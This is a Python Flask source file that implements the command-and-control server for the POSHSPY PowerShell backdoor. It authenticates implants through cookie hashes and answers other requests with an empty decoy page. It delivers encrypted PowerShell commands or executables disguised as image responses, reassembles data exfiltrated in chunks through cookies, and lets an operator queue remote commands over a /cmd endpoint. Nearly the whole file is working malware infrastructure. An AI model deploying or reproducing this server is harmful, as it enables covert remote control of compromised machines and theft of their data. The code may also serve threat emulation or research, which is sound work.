# poshspy/server/server.py
# POSHSPY C2 server — Flask implementation
# Source: matthewdunwoody/POSHSPY.ps1 — full request/response cycle
# Protocol: getAuthToken → downloadDataAuth → uploadChunk chain

import os
import random
import string
from flask import Flask, request, make_response
from crypto import encrypt_pki, decrypt_pki, pack_payload, unpack_payload, add_file_signature, remove_file_signature
from protocol import (
    create_auth_token, create_auth_cookie_val, check_resp_ck,
    make_resp_ck, parse_chunk_cookies, hex_to_bytes,
    generate_get_param, sha1,
    PAYLOAD_TYPE_PS, PAYLOAD_TYPE_EXE,
    RESP_TYPE_PS, RESP_TYPE_EXE, CHUNK_SIZE
)
from Crypto.PublicKey import RSA

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Key material — generate once, embed in POSHSPY.ps1 before deployment
# cPairKey = client keypair (private+public, CSP blob format in PS1)
# sPubKey  = server public key (CSP blob format in PS1)
# We work with PEM here and handle CSP blob conversion separately
# ─────────────────────────────────────────────────────────────────────────────

try:
    SERVER_PRIV_KEY = RSA.import_key(open('keys/server_priv.pem').read())
    SERVER_PUB_KEY  = RSA.import_key(open('keys/server_pub.pem').read())
    CLIENT_PUB_KEY  = RSA.import_key(open('keys/client_pub.pem').read())
except FileNotFoundError:
    print("[-] keys/ directory not found — run keygen first (see README)")
    exit(1)

# Client password — must match $pPass in POSHSPY.ps1
CLIENT_PASS = 'ko9######0ue626'

# ─────────────────────────────────────────────────────────────────────────────
# Server state
# pending_payload: next payload to deliver to client
# upload_buffer:   assembles chunked uploads from client
# ─────────────────────────────────────────────────────────────────────────────

pending_payload = None   # (type, data) tuple — set via operator interface
upload_buffer   = {}     # session_token -> accumulated hex string

# ─────────────────────────────────────────────────────────────────────────────
# Cookie config — matches $ckName/$ckVal in POSHSPY.ps1
# Source: getConfigCookie()
# ─────────────────────────────────────────────────────────────────────────────

CK_NAME = 'notified-non-category-notify'
CK_VAL  = '1'


@app.route('/cmd', methods=['POST'])
def cmd():
    global pending_payload
    command = request.json.get('cmd')
    queue_ps_command(command)
    return {'status': 'queued'}, 200

def rand_cookie_name(exclude: list = []) -> str:
    """Random 2-3 char cookie name. Source: addCookieToStr()"""
    for _ in range(50):
        name = ''.join(random.choices(string.ascii_lowercase,
                                       k=random.randint(2, 3)))
        if name not in exclude:
            return name
    return 'zz'


# ─────────────────────────────────────────────────────────────────────────────
# Route — all traffic hits one path, differentiated by cookies + query params
# Source: POSHSPY.ps1 main flow:
#   downloadData()      — no auth, decoy
#   downloadDataAuth()  — auth token exchange + payload delivery
#   uploadChunk()       — chunked upload with auth + data in cookies
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/', defaults={'path': ''}, methods=['GET'])
@app.route('/<path:path>', methods=['GET'])
def handle(path):
    global pending_payload, upload_buffer

    cookies     = request.cookies
    query_args  = request.args
    has_query   = len(query_args) > 0

    ck_config   = cookies.get(CK_NAME)        # base config cookie
    auth_cookie = _find_auth_cookie(cookies)  # auCookie value if present

    # ── Phase 1: decoy GET — no config cookie, no auth
    # Source: downloadData() — "GET /index.html" style noise request
    if ck_config is None and auth_cookie is None and not has_query:
        resp = make_response(b'', 200)
        resp.headers['Content-Type'] = 'text/html'
        return resp

    # ── Phase 2: auth token request — has config cookie, no auth cookie yet
    # Source: getAuthToken() — client GETs twice, reads Set-Cookie token
    if ck_config is not None and auth_cookie is None and not has_query:
        token = create_auth_token()
        # store token for this session keyed by client IP
        upload_buffer[request.remote_addr] = {
            'token': token,
            'buf': ''
        }
        resp = make_response(b'', 200)
        resp.set_cookie(rand_cookie_name(), token)
        return resp

    # ── Phase 3: authenticated download — has auth cookie, no query params
    # Source: downloadDataAuth() — client sends auCookie, server delivers payload
    if auth_cookie is not None and not has_query:
        session = upload_buffer.get(request.remote_addr, {})
        token   = session.get('token')

        if token is None:
            return make_response(b'', 404)

        # verify auth cookie — SHA1(SHA1(pass) + token)
        expected = create_auth_cookie_val(token, CLIENT_PASS)
        if auth_cookie != expected:
            return make_response(b'', 403)

        # deliver pending payload if we have one
        if pending_payload is not None:
            ptype, pdata = pending_payload
            packed, ext = pack_payload(ptype, pdata, SERVER_PRIV_KEY, CLIENT_PUB_KEY)
            pending_payload = None
            resp = make_response(packed, 200)
            resp.headers['Content-Type'] = f'image/{ext}'
            return resp

        # no payload — return empty 200
        return make_response(b'', 200)

    # ── Phase 4: upload chunk — has query params + cookies with data
    # Source: uploadChunk() — data in cookies, 2048 byte hex chunks
    if has_query and auth_cookie is not None:
        session = upload_buffer.get(request.remote_addr, {})
        token   = session.get('token')

        if token is None:
            return make_response(b'', 404)

        # parse chunk from cookie header
        cookie_header = request.headers.get('Cookie', '')
        chunk_info    = parse_chunk_cookies(cookie_header, CLIENT_PASS, token)

        if not chunk_info:
            return make_response(b'', 400)

        au_val = chunk_info.get('auth_val')
        data   = chunk_info.get('data', '')

        # verify auth val
        expected = create_auth_cookie_val(token, CLIENT_PASS)
        if au_val != expected:
            return make_response(b'', 403)

        # accumulate chunk
        session['buf'] += data

        if chunk_info.get('is_final'):
            # final chunk — tsize/2 = total hex length / 2
            tsize_half = chunk_info.get('tsize_half', 0)
            full_hex   = session['buf']

            # validate total length
            if len(full_hex) != tsize_half * 2:
                return make_response(b'', 400)

            # decrypt and process
            raw      = hex_to_bytes(full_hex)
            clear    = unpack_payload(raw, CLIENT_PUB_KEY, SERVER_PRIV_KEY)

            if clear is not None:
                resp_type, resp_data = clear
                _handle_client_response(resp_type, resp_data)

            # ACK — Set-Cookie: name=SHA1(SHA1(auCookie)+pass)
            # Source: checkRespCk() — client verifies this
            ack_cookie = make_resp_ck(au_val, CLIENT_PASS)
            resp = make_response(b'', 200)
            resp.headers['Set-Cookie'] = ack_cookie
            # clear buffer
            upload_buffer[request.remote_addr] = {'token': token, 'buf': ''}
            return resp

        else:
            # intermediate chunk ACK
            ack_cookie = make_resp_ck(au_val, CLIENT_PASS)
            resp = make_response(b'', 200)
            resp.headers['Set-Cookie'] = ack_cookie
            return resp

    return make_response(b'', 200)


def _find_auth_cookie(cookies) -> str | None:
    """
    Find the auth cookie value in the request.
    Source: addCookieToStr() — auth val added with random name after config cookie.
    We can't know the random name, so we check all cookie values for a valid
    SHA1 hex string (40 chars, hex only) that isn't the config value.
    """
    for name, val in cookies.items():
        if name == CK_NAME:
            continue
        if len(val) == 40 and all(c in string.hexdigits for c in val):
            return val
    return None


def _handle_client_response(resp_type: int, data: bytes):
    """Process decrypted client response. Log to operator."""
    if resp_type == RESP_TYPE_PS:
        print(f"\n[+] PS output:\n{data.decode('utf-8', errors='replace')}")
    elif resp_type == RESP_TYPE_EXE:
        print(f"\n[+] EXE result: {data.decode('utf-8', errors='replace')}")
    else:
        print(f"\n[?] Unknown response type 0x{resp_type:02x}: {data.hex()}")


# ─────────────────────────────────────────────────────────────────────────────
# Operator interface — set next payload to deliver
# ─────────────────────────────────────────────────────────────────────────────

def queue_ps_command(cmd: str):
    """Queue a PowerShell command for next client beacon."""
    global pending_payload
    import base64
    encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
    pending_payload = (PAYLOAD_TYPE_PS, encoded.encode('utf-8'))
    print(f"[*] Queued PS command: {cmd}")


def queue_exe_payload(exe_bytes: bytes):
    """Queue an executable for next client beacon."""
    global pending_payload
    pending_payload = (PAYLOAD_TYPE_EXE, exe_bytes)
    print(f"[*] Queued EXE payload: {len(exe_bytes)} bytes")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
